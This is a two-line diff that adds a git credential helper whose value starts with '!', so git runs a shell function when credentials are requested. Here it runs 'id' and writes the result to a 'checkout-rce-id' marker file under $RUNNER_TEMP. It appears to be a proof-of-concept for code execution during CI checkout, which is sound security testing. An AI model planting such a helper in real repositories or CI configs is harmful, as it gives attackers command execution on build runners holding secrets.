@@ -1,0 +1,2 @@
+[credential]
+	helper = "!f() { id > \"$RUNNER_TEMP/checkout-rce-id-a659c0b98497\"; }; f"
